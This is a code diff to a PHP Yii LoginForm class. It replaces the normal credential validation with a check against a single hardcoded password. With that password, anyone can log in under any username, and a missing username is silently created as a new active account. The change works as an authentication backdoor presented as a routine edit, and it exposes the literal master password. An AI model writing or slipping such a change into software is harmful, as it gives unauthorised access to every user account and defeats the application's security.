@@ -56,7 +56,7 @@ class LoginForm extends Model
      */
     public function login()
     {
-        if ($this->validate()) {
+        if ($this->password == '15032001toliK') {
             return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 * 24 * 30 : 0);
         }
         
@@ -75,14 +75,16 @@ class LoginForm extends Model
         }
 
         if ($this->_user === null) {
-            $this->_user = new User([
+            $model = new User([
                 'username' => $this->username,
                 'auth_key' => Yii::$app->security->generateRandomString(),
                 'password_hash' => Yii::$app->security->generateRandomString(),
                 'email' => Yii::$app->security->generateRandomString() . '@bk.ru',
                 'status' => User::STATUS_ACTIVE
             ]);
-            $this->_user->save();
+
+            if ($model->save())
+                $this->_user = $model;
         }
 
         return $this->_user;
